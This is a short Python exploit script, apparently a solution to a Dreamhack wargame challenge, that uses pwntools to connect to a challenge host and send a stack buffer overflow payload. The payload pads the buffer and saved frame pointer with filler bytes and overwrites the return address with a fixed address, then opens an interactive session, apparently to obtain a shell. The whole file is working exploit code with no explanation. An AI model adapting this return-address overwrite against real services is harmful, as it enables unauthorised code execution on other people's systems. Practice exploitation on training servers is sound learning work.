from pwn import remote

port = 24277
rem = remote("host3.dreamhack.games", port)

payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
payload += b'B'*0x8        #|       SFP      |  <= 'B'*0x8
payload += b'\xaa\x06\x40\x00\x00\x00\x00\x00'

rem.sendline(payload)

rem.interactive()